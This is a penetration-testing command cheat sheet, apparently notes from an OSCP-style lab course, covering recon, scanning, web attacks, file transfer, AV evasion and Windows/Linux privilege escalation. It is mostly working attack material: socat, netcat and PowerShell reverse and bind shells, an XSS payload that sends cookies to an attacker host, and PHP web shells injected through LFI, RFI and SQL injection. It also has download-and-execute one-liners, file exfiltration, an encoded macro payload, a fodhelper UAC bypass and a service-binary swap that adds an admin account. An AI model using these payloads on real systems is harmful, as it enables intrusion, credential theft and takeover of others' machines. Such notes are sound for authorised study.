# SUMMARY OF COMMANDS

## HOW THIS WORKS

This will be a rundown of the most common commands used for tests<br>
This is not a complete list, so research others as appropriate.

<hr>

# KALI

```
kali@kali:~$ apropos partition
kali@kali:~$ mkdir -p test/{recon,exploit,report}
kali@kali:~$ echo $PATH
kali@kali:~$ sudo ss -antlp | grep sshd
kali@kali:~$ systemctl list-unit-files
kali@kali:~$ apt-cache search
kali@kali:~$ apt show
kali@kali:~$ export b=10.11.1.220
kali@kali:~$ env
kali@kali:~$ history
kali@kali:~$ cat error.txt | wc -m > count.txt
kali@kali:~$ echo "hello::there::friend" | awk -F "::" '{print $1, $3}'
kali@kali:~$ cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn

GREP AND SORT
kali@kali:~$ cat access.log | grep '208.68.234.99' | grep '/admin ' | sort -u

FIND COMONALITIES
kali@kali:~$ comm -12 scan-a.txt scan-b.txt

FIND DIFFERENCES
kali@kali:~$ diff -c scan-a.txt scan-b.txt

BAKGROUND JOBS
kali@kali:~$ ping -c 400 localhost > ping_results.txt
^Z
kali@kali:~$ jobs
kali@kali:~$ fg
^C

kali@kali:~$ ps -ef

LIST PROCESS BY NAME
kali@kali:~$ ps -fC leafpad

kali@kali:~$ kill 1307

VIEW FILE IN REALTIME
kali@kali:~$ sudo tail -f /var/log/apache2/access.log

DOWNLOAD ACCELLERATOR
kali@kali:~$ axel -a -n 20 -o report_axel.pdf

FORMAT HISTORY COMMAND
kali@kali:~$ export HISTIGNORE="&:ls:[bf]g:exit:history"
kali@kali:~/test$ export HISTTIMEFORMAT='%F %T '
kali@kali:~/test$ history

kali@kali:~$ alias lsa='ls -la'
kali@kali:~$ unalias mkdir

CUSTOMIZE
kali@kali:~$ cat ~/.bashrc
```

<hr>

# NETCAT

```
CONNECT TO POP SERVER
kali@kali:~$ nc -nv 10.11.0.22 110
+OK POP3 server lab ready <00003.1277944@lab>

LISTENER AND CONNECT
C:\Users\offsec> nc -nlvp 4444
kali@kali:~$ nc -nv 10.11.0.22 4444

C:\Users\offsec> nc -nlvp 4444 > incoming.exe
kali@kali:~$ nc -nv 10.11.0.22 4444 < /usr/share/wget.exe

C:\Users\offsec> nc -nlvp 4444 -e cmd.exe
```

<hr>

# SOCAT

```
kali@kali:~$ nc <remote server's ip address> 80
kali@kali:~$ socat - TCP4:<remote server's ip address>:80

RECEIVE FILE
kali@kali:~$ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
C:\Users\offsec> socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create

REVERSE SHELL
C:\Users\offsec> socat -d -d TCP4-LISTEN:443 STDOUT
kali@kali:~$ socat TCP4:10.11.0.22:443 EXEC:/bin/bash

BIND WITH ENCRYPTION
kali@kali:~$ sudo socat OPENSSLLISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
C:\Users\offsec> socat - OPENSSL:10.11.0.4:443,verify=0
```

<hr>

# POWERSHELL

```
PS C:\WINDOWS\system32> Set-ExecutionPolicy Unrestricted

PS C:\WINDOWS\system32> Get-ExecutionPolicy

TRANSFER FILES
C:\Users\offsec> powershell -c "(new-objectSystem.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"

REVERSE SHELL

$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush();
}
$client.Close();

C:\Users\offsec> powershell -c "$client = New-Object
System.Net.Sockets.TCPClient('10.11.0.4',443);$stream =
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -
TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback =
(iex $data 2>&1 | Out- String );$sendback2 = $sendback + 'PS ' +
(pwd).Path + '> ';$sendbyte =
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$s
endbyte.Leng th);$stream.Flush();}$client.Close()"

BIND SHELL

C:\Users\offsec> powershell -c "$listener = New-Object
System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client =
$listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes =
0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{;$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data
2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '>
';$sendbyte =
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$s
endbyte.Leng th);$stream.Flush()};$client.Close();$listener.Stop()"

kali@kali:~$ nc -nv 10.11.0.22 443
```

<hr>

# POWERCAT

```
PS C:\Users\Offsec> . .\powercat.ps1

PS C:\Users\Offsec> iex (New-ObjectSystem.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/po wercat/master/powercat.ps1')

PS C:\Users\offsec> powercat -h

RECEIVE FILES
kali@kali:~$ sudo nc -lnvp 443 > receiving_powercat.ps1
PS C:\Users\Offsec> powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1

REVERSE SHELL
kali@kali:~$ sudo nc -lvp 443
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe

BIND SHELL
PS C:\Users\offsec> powercat -l -p 443 -e cmd.exe
kali@kali:~$ nc 10.11.0.22 443

PAYLOADS
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
PS C:\Users\offsec> ./reverseshell.ps1

ENCRYPT PAYLOAD
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
```

<hr>

# WIRESHARK

```
kali@kali:~$ sudo wireshark
```

<hr>

# TCPDUMP

```
kali@kali:~$ sudo tcpdump -r password_cracking_filtered.pcap

FILTER

kali@kali:~$ sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F"" '{print$5}' | sort | uniq -c | head

sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap

sudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap

sudo tcpdump -n port 81 -r password_cracking_filtered.pcap

kali@kali:~$ sudo tcpdump -nX -r password_cracking_filtered.pcap

kali@kali:~$ sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
```

<hr>

# BASH SCRIPTING

```
if [ <some test> ]
then
<perform action>
elif [ <some test> ]
then
<perform different action>
else
<perform yet another different action>
fi

for var-name in <list>
do
<action to perform>
done

while [ <some test> ]
do
<perform an action>
done

function function_name {
commands...
}
OR
function_name () {
commands...
}

FUNCTIONS
#!/bin/bash
# function return value example
return_me() {
echo "Oh hello there, I'm returning a random value!"
	return $RANDOM
}
return_me
echo "The previous function returned a value of $?"

LOCAL VARIABLES
name_change() {
	local name1="Edward"
echo "Inside of this function, name1 is $name1 and name2 is $name2"
	name2="Lucas"
}

GREP / AWK / CUT
kali@kali:~$ grep -o '[^/]*\.megacorpone\.com' index.html | sort -u > list.txt
kali@kali:~$ for url in $(cat list.txt); do host $url; done | grep "has address" | cut -d " " -f 4 | sort -u

FILTER SEARCHSPLOIT
kali@kali:~$ for e in $(searchsploit afd windows -w -t | grep http | cut -
f 2 -d "|"); do exp_name=$(echo $e | cut -d "/" -f 5) && url=$(echo $e |
sed 's/exploits/raw/') && wget -q --no-check-certificate $url -O
$exp_name; done

#!/bin/bash
# Bash script to search for a given exploit and download all matches.
for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d "|")
do
	exp_name=$(echo $e | cut -d "/" -f 5)
	url=$(echo $e | sed 's/exploits/raw/')
	wget -q --no-check-certificate $url -O $exp_name
done

FILTER NMAP
kali@kali:~/temp$ cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap" | awk '{print $2}'

GET PICS OF A WEBSITE
kali@kali:~/temp$ for ip in $(cat nmap-scan_10.11.1.1-254 | grep 80 | grep
-v "Nmap" | awk '{print $2}'); do cutycapt --url=$ip --out=$ip.png;done

#!/bin/bash
# Bash script to examine the scan results through HTML.
echo "<HTML><BODY><BR>" > web.html
ls -1 *.png | awk -F : '{ print $1":\n<BR><IMG SRC=\""$1""$2"\" width=600>
<BR>"}' >> web.html
echo "</BODY></HTML>" >> web.html
```

<hr>

# PASSIVE GATHERING

```
kali@kali:~$ whois megacorpone.com

kali@kali:~$ whois 38.100.193.70

GOOGLE
site:url.com filetype:php ext:jsp -filetype:html

kali@kali:~$ recon-ng
recon-ng][default] > marketplace search github
[recon-ng][default] > marketplace info recon/domains-hosts/google_site_web
[recon-ng][default] > marketplace install recon/domainshosts/google_site_web
[recon-ng][default] > modules load recon/domains-hosts/google_site_web
[recon-ng][default][google_site_web] > info
[recon-ng][default][google_site_web] > options set SOURCE megacorpone.com
[recon-ng][default][google_site_web] > run
[recon-ng][default][google_site_web] > back
[recon-ng][default] > show hosts
[recon-ng][default] > marketplace install recon/hosts-hosts/resolve
[recon-ng][default] > modules load recon/hosts-hosts/resolve
[recon-ng][default][resolve] > run
[recon-ng][default][resolve] > show hosts

GITHUB

SHODAN

HEADER SCANNER
https://securityheaders.com/

SSL TEST
https://www.ssllabs.com/ssltest/

PASTEBIN
https://pastebin.com/

HARVESTER FOR USER ENUMERATION
https://github.com/laramies/theHarvester
kali@kali:~$ theharvester -d megacorpone.com -b google

SOCIAL MEDIA
https://www.social-searcher.com
https://digi.ninja/projects/twofi.php 
https://github.com/initstring/linkedin2username
https://osintframework.com/

MALTEGO
```

<hr>

# ACTIVE GATHERING

```
kali@kali:~$ host www.megacorpone.com
kali@kali:~$ host -t mx megacorpone.com
kali@kali:~$ host -t txt megacorpone.com
kali@kali:~$ host idontexist.megacorpone.com

kali@kali:~$ for ip in $(cat list.txt); do host $ip.megacorpone.com; done
kali@kali:~$ for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"

DNS ZONE TRANSFERS
host -l <domain name> <dns server address>

SCRIPT ZONE TRANSFERS
#!/bin/bash
# Simple Zone Transfer Bash Script
# $1 is the first argument given after the bash script
# Check if argument was given, if not, print usage
if [ -z "$1" ]; then
	echo "[*] Simple Zone transfer script"
	echo "[*] Usage : $0 <domain name> "
exit 0
fi
# if argument was given, identify the DNS servers for the domain
for server in $(host -t ns $1 | cut -d " " -f4); do
	# For each of these servers, attempt a zone transfer
	host -l $1 $server |grep "has address"
done

kali@kali:~$ dnsrecon -d megacorpone.com -t axfr
kali@kali:~$ dnsrecon -d megacorpone.com -D ~/list.txt -t brt
kali@kali:~$ dnsenum zonetransfer.me
```

<hr>

# SCANNING

```
kali@kali:~$ nc -nvv -w 1 -z 10.11.1.220 3388-3390
kali@kali:~$ nc -nv -u -z -w 1 10.11.1.115 160-162
kali@kali:~$ nmap -p 1-65535 10.11.1.220 (NOISY!)
kali@kali:~$ sudo nmap -sS 10.11.1.220 (STEALTH)
kali@kali:~$ nmap -sT 10.11.1.220 (CONNECT SCAN)
kali@kali:~$ sudo nmap -sU 10.11.1.115 (UDP SCAN)
kali@kali:~$ nmap -sn 10.11.1.1-254 (MULTIPLE TYPES OF SCANS - TCP SYN)
kali@kali:~$ grep Up ping-sweep.txt | cut -d " " -f 2
kali@kali:~$ nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-portsweep.txt
kali@kali:~$ sudo nmap -O 10.11.1.220 (OS FINGERPRINTING)
kali@kali:~$ nmap -sV -sT -A 10.11.1.220 (BANNER GRABBING)
kali@kali:~$ nmap 10.11.1.220 --script=smb-os-discovery (SCRIPTING ENGINE)
kali@kali:~$ nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com (ZONE TX)

kali@kali:~$ sudo masscan -p80 10.0.0.0/8
kali@kali:~$ sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --routerip 10.11.0.1

SMB AND NETBIOS
kali@kali:~$ nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254
kali@kali:~$ sudo nbtscan -r 10.11.1.0/24
kali@kali:~$ nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227

NFS
kali@kali:~$ nmap -v -p 111 10.11.1.1-254
kali@kali:~$ nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
kali@kali:~$ nmap -p 111 --script nfs* 10.11.1.72
kali@kali:~$ sudo mount -o nolock 10.11.1.72:/home ~/home/
kali@kali:~/home/marcus$ ls -la
-rwx------ 1 1014 1014 48 Jun 10 09:16 creds.txt
CREATE USER TO VIEW FILE
kali@kali:~/home/stefan$ sudo adduser pwn
kali@kali:~/home/marcus$ su pwn
kali@kali:~/home/marcus$ sudo sed -i -e 's/1001/1014/g' /etc/passwd
pwn@kali:/root/home/marcus$ cat creds.txt

SMTP
kali@kali:~$ nc -nv 10.11.1.217 25 (CONNECT)
(UNKNOWN) [10.11.1.217] 25 (smtp) open
220 hotline.localdomain ESMTP Postfix
VRFY root
252 2.0.0 root
VRFY idontexist

BASH SCRIPT FOR SMTP

#!/usr/bin/python
import socket
import sys
if len(sys.argv) != 2:
print "Usage: vrfy.py <username>"
sys.exit(0)
# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to the Server
connect = s.connect(('10.11.1.217',25))
# Receive the banner
banner = s.recv(1024)
print banner
# VRFY a user
s.send('VRFY ' + sys.argv[1] + '\r\n')
result = s.recv(1024)
print result
# Close the socket
s.close()

SNMP
kali@kali:~$ sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt
kali@kali:~$ for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips
kali@kali:~$ onesixtyone -c community -i ips

kali@kali:~$ snmpwalk -c public -v1 -t 10 10.11.1.14
kali@kali:~$ snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25
kali@kali:~$ snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2
kali@kali:~$ snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3
kali@kali:~$ snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2
```

<hr>

# VULNERABILITY SCANNING

```
NSE (NMAP)
kali@kali:~$ cd /usr/share/nmap/scripts/

NESSUS
```

<hr>

# WEB

```
INSPECT URLS AND PAGE CONTENT

kali@kali:~$ curl https://www.google.com/robots.txt
kali@kali:~$ dirb http://www.megacorpone.com -r -z 10

BURPSUTE
USE BRUTE FORCE
CHANGE COOKIES
MAKE MULTIPE REQUESTS WITH NEW TOKENS

NIKTO
kali@kali:~$ nikto -host=http://www.megacorpone.com -maxtime=30s

XSS
< > ' " { } ;
<script>alert(‘XSS’)</script>
<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe>
<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>

STEAL COOKIES WITH XSS

DIRECTORY TRAVERSAL
../../../../../etc/passwd
http://website.com/menu.php?file=invalid.php (WATCH FOR ERROR)
http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts

LFI
kali@kali:~$ nc -nv 10.11.0.22 80
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?> (INJECT CMD)
http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig

RFI
kali@kali:/var/www/html$ cat evil.txt
<?php echo shell_exec($_GET['cmd']); ?>
http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt
http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig

HTTP SERVERS
kali@kali:~$ python -m SimpleHTTPServer 7331
kali@kali:~$ python3 -m http.server 7331
kali@kali:~$ php -S 0.0.0.0:8000
kali@kali:~$ ruby -run -e httpd . -p 9000
kali@kali:~$ busybox httpd -f -p 10000

DATA WRAPPERS
http://10.11.0.22/menu.php?file=data:text/plain,hello world
http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>

SQLI
select * from users where name = 'tom' or 1=1;#' and password = 'jones';

DB ENUMERATION
10.11.0.22/debug.php?id='
http://10.11.0.22/debug.php?id=1 order by 1
http://10.11.0.22/debug.php?id=1 union all select 1, 2, 3
http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version
http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()
http://10.11.0.22/debug.php?id=1 union all select 1, 2, 
	table_name from information_schema.tables
http://10.11.0.22/debug.php?id=1 union all select 1, 2, 
	column_name from information_schema.columns where table_name='users'
http://10.11.0.22/debug.php?id=1 union all select 1, 
	username, password from users
http://10.11.0.22/debug.php?id=1 union all select 1, 2, 
	load_file('C:/Windows/System32/drivers/etc/hosts')
http://10.11.0.22/debug.php?id=1 union all select 1, 2, 
	"<?php echo shell_exec($_GET['cmd']);?>" 
	into OUTFILE 'c:/xampp/htdocs/backdoor.php' 
	10.11.0..22/backdoor.php?cmd=ipconfig

SQLMAP
kali@kali:~$ sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
kali@kali:~$ sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
kali@kali:~$ sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
```

<hr>

# BUFFER OVERFLOWS

SEE PDF

<hr>

# CLIENT SIDE ATTACKS

```
PASSIVE LIKE GOOGLE

ACTIVE LIKE SOCIAL ENGINEERING AND OTHERS (SEE ABOVE)

FLIENT FINGERPRINTING
kali@kali:/var/www/html$ sudo wget https://github.com/Valve/fingerprintjs2/archive/master.zip
kali@kali:/var/www/html$ sudo unzip master.zip
kali@kali:/var/www/html$ sudo mv fingerprintjs2-master/ fp
kali@kali:/var/www/html$ sudo chown www-data:www-data fp

MS OFFICE MACRO
Sub MyMacro()
CreateObject("Wscript.Shell").Run "cmd"
End Sub

USE PYTHON TO SPLIT UP THE CODE (MACRO RESTRICTIONS)
str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."
n = 50
for i in range(0, len(str), n):
print "Str = Str + " + '"' + str[i:i+n] + '"'

Sub MyMacro()
Dim Str As String
Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
...
Str = Str + "QA="
CreateObject("Wscript.Shell").Run Str
End Sub
```

<hr>

# PUBLIC EXPLOITS

```
https://www.exploit-db.com
https://www.securityfocus.com
https://packetstormsecurity.com
kali@kali:~$ firefox --search "Microsoft Edge site:exploit-db.com"

SEARCHSPLOIT
kali@kali:~$ sudo apt update && sudo apt install exploitdb
kali@kali:~$ searchsploit
kali@kali:~$ searchsploit -m 42341
kali@kali:~$ searchsploit remote smb microsoft windows

NMAP NSE (SEE ABOVE)

BeEF
kali@kali:~$ sudo beef-xss

METASPLOIT
```

<hr>

# FIXING EXPLOITS

```
kali@kali:~$ searchsploit -m 42341

CROSS COMPILE
kali@kali:~$ sudo apt install mingw-w64
kali@kali:~$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32

LOOK AT THE CODE AND FIX WHAT YOU NEED...
```

<hr>

# FILE TRANSFERS

```
kali@kali:~$ sudo apt update && sudo apt install pure-ftpd
kali@kali:~$ cat ./setup-ftp.sh
kali@kali:~$ chmod +x setup-ftp.sh
kali@kali:~$ sudo ./setup-ftp.sh

student@debian:~$ ftp 10.11.0.4
student@debian:~$ nc -lvnp 4444 -e /bin/bash
kali@kali:~$ nc -vn 10.11.0.128 4444
python -c 'import pty; pty.spawn("/bin/bash")'
student@debian:~$ ftp 10.11.0.4

ON WINDOWD, TRANSFER FROM KALI VIA FTP
C:\Users\offsec> ftp -h
kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/
kali@kali:~$ sudo systemctl restart pure-ftpd
C:\Users\offsec>echo open 10.11.0.4 21> ftp.txt
C:\Users\offsec>echo USER offsec>> ftp.txt
C:\Users\offsec>echo lab>> ftp.txt
C:\Users\offsec>echo bin >> ftp.txt
C:\Users\offsec>echo GET nc.exe >> ftp.txt
C:\Users\offsec>echo bye >> ftp.txt
C:\Users\offsec> ftp -v -n -s:ftp.txt
ftp> open 192.168.1.31 21
ftp> USER offsec
ftp> bin
ftp> GET nc.exe
ftp> bye
C:\Users\offsec> nc.exe -h

BASH SCRIPT FOR DOWNLOADING (SEE PDF)

POWERSHELL
C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
C:\Users\Offsec> echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1
C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1

DOWNLOAD AND EXECUTE
C:\Users\Offsec> powershell.exe -ExecutionPolicy Bypass -NoLogo -
NonInteractive - NoProfile -File wget.ps1

DOWNLOAD FILE AND EXECUTE (ONE LINER)
C:\Users\Offsec> powershell.exe (New-Object
System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'newexploit.
exe')

DON'T SAVE THE FILE TO HARD DRIVE
C:\Users\Offsec> powershell.exe IEX (New-Object
System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')

MAKE FILE SMALLER
kali@kali:~$ upx -9 nc.exe
kali@kali:~$ exe2hex -x nc.exe -p nc.cmd

WINDOWS UPLOAD WITH SCRIPT
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>

START HTTP SERVER
kali@kali:/var/www$ sudo mkdir /var/www/uploads

C:\Users\Offsec> powershell (New-Object
System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php',
'important.docx')

UPLOAD WITH TFTP
kali@kali:~$ sudo apt update && sudo apt install atftp
kali@kali:~$ sudo mkdir /tftp
kali@kali:~$ sudo chown nobody: /tftp
kali@kali:~$ sudo atftpd --daemon --port 69 /tftp

C:\Users\Offsec> tftp -i 10.11.0.4 put important.docx
```

<hr>

# ANTIVIRUS EVASION

TYPES OF DETECTION
- Signature-based detectin
- Heuristic-based detection
- Behavioral-based detection

ON DISK EVASION
- Packers - make the file smaller with a different signiture
- Obfuscators - replacing code with other code that still works
- Crypters - alters code with encryption and adds a decrypting stub to restore original code

```
COMMON EXPLOIT THAT WILL BE CAUGHT
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f exe > binary.exe

POLICY CHANGING
C:\Users\offsec\Desktop> powershell
PS C:\Users\offsec\Desktop> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser

SHELLTER - USE WINE ON LINUX IF NOT USING WINDOWS
kali@kali:~$ sudo apt install shellter
kali@kali:~$ apt install wine
```

PERHAPS ADD MORE HERE...

<hr>

# PRIVILEGE ESCALATION

TASKS:
Enumerating Users
Enumerating the Hostname
Enumerating the Operating System Version and Architecture
Enumerating Running Processes and Services
Enumerating Networking Information
Enumerating Firewall Status and Rules
Enumerating Scheduled Tasks
Enumerating Installed Applications and Patch Levels
Enumerating Readable/Writable Files and Directories
Enumerating Unmounted Disks
Enumerating Device Drivers and Kernel Modules
Enumerating Binaries That AutoElevate

```
USERS
C:\Users\student>whoami
c:\Users\admin>whoami /groups
C:\Users\student>net user student
student@debian:~$ id
C:\Users\student>net user
student@debian:~$ cat /etc/passwd

OPERATING SYSTEM
C:\Users\student>hostname
student@debian:~$ hostname
C:\Users\student>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
student@debian:~$ cat /etc/issue
student@debian:~$ cat /etc/*-release
student@debian:~$ uname -a

SERVICES AND TASKS
C:\Users\student>tasklist /SVC
student@debian:~$ ps axu
c:\Users\student>schtasks /query /fo LIST /v
student@debian:~$ ls -lah /etc/cron*
student@debian:~$ cat /etc/crontab

NETWORK
C:\Users\student>ipconfig /all
C:\Users\student>route print
C:\Users\student>netstat -ano
student@debian:~$ ip a
student@debian:~$ /sbin/route
student@debian:~$ ss -anp
student@debian:~$ netstat -anp

FIREWALL
C:\Users\student>netsh advfirewall show currentprofile
C:\Users\student>netsh advfirewall firewall show rule name=all
student@debian:~$ iptables -L (needs to be run as sudo)
student@debian:~$ cat /etc/iptables
student@debian:~$ cat /etc/iptables-save
student@debian:~$ cat /etc/iptables-restore (if run previously by sudo)

INSTALLS
c:\Users\student>wmic product get name, version, vendor
c:\Users\student>wmic qfe get Caption, Description, HotFixID, InstalledOn
student@debian:~$ dpkg -l
c:\Tools\privilege_escalation\SysinternalsSuite>accesschk.exe -uws "Everyone" "C:\Program Files"
PS C:\Tools\privilege_escalation\SysinternalsSuite>Get-ChildItem "C:\Program Files" - Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
student@debian:~$ find / -writable -type d 2>/dev/null

DISKS
c:\Users\student>mountvol
student@debian:~$ cat /etc/fstab
student@debian:~$ mount
student@debian:~$ /bin/lsblk

KERNEL AND DRIVERS
c:\Users\student>powershell
PS C:\Users\student> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
PS C:\Users\student> Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName - like "*VMware*"}
student@debian:~$ lsmod
student@debian:~$ /sbin/modinfo libata (needs full pathname to run)

BINARIES THAT AUTOSAVE
c:\Users\student>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
c:\Users\student>reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
student@debian:~$ find / -perm -u=s -type f 2>/dev/null

AUTO ENUMERATION
c:\Tools\privilege_escalation\windows-privesc-check-master>windowsprivesc-check2.exe -h
c:\Tools\privilege_escalation\windows-privesc-check-master>windowsprivesc-check2.exe --dump -G
student@debian:~$./unix-privesc-check
student@debian:~$ ./unix-privesc-check standard > output.txt

INTERACTIVE
c:\Users\admin>whoami /groups Mandatory Label\Medium Mandatory Level
C:\Users\admin> net user admin Ev!lpass
C:\Users\admin>powershell.exe Start-Process cmd.exe -Verb runAs
C:\Windows\system32> whoami /groups Mandatory Label\High Mandatory Level Label S-1-16-12288
C:\Windows\system32> net user admin Ev!lpass

INTERACTIVE - FODHELPER
C:\Windows\System32\fodhelper.exe
C:\> cd C:\Tools\privilege_escalation\SysinternalsSuite
C:\Tools\privilege_escalation\SysinternalsSuite> sigcheck.exe -a -m
C:\Windows\System32\fodhelper.exe

C:\Users\admin> REG ADD HKCU\Software\Classes\mssettings\Shell\Open\command
The operation completed successfully.
C:\Users\admin> REG ADD HKCU\Software\Classes\mssettings\Shell\Open\command /v DelegateExecute /t REG_SZ
The operation completed successfully.
C:\Users\admin> REG ADD HKCU\Software\Classes\mssettings\Shell\Open\command /d "cmd.exe" /f
The operation completed successfully.
C:\Windows\system32> net user admin Ev!lpass
The command completed successfully.

INSECURE FILE PERMISSIONS - START
PS C:\Users\student> Get-WmiObject win32_service | Select-Object Name,
State, PathName | Where-Object {$_.State -like 'Running'}
C:\Users\student> icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
C:\Program Files\Serviio\bin\ServiioService.exe BUILTIN\Users:(I)(F)
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
APPLICATION PACKAGE AUTHORITY\ALL
USE C TO WRITE A SCRIPT THAT WILL ADD A USER AT ADMIN LEVEL
#include <stdlib.h>
int main ()
{
int i;
i = system ("net user evil Ev!lpass /add");
i = system ("net localgroup administrators evil /add");
return 0;
}

kali@kali:~$i686-w64-mingw32-gcc adduser.c -o adduser.exe

C:\Users\student> move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"
1 file(s) moved.

C:\Users\student> move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
1 file(s) moved.

C:\Users\student> dir "C:\Program Files\Serviio\bin\"
Volume in drive C has no label.
Volume Serial Number is 56B9-BB74

C:\Users\student> net stop Serviio
System error 5 has occurred.
Access is denied.

C:\Users\student>wmic service where caption="Serviio" get name, caption, state, startmode
Caption Name StartMode State
Serviio Serviio Auto Running

C:\Users\student>whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name Description State
============================= ====================================
========
SeShutdownPrivilege Shut down the system Disabled
C:\Users\student\Desktop> shutdown /r /t 0
C:\Users\evil> net localgroup Administrators
Alias name Administrators
Comment Administrators have complete and unrestricted access to the
computer/domain Members
admin
Administrator
corp\Domain Admins
corp\offsec
evil
The command completed successfully.
INSECURE FILE PERMISSIONS - END

UNQUOTED SERVICE PATHS
WHEN A DIRECTORY IS UNQUOTED, IT WINDOWS WILL TRY THIS TO GET TO THE FILE:
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe

WINDOWS KERNEL
C:\> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
C:\Users\student\Desktop>driverquery /v
    USBPcap USBPcap Capture Servic USBPcap Capture Servic Kernel Manual
kali@kali:~# searchsploit USBPcap
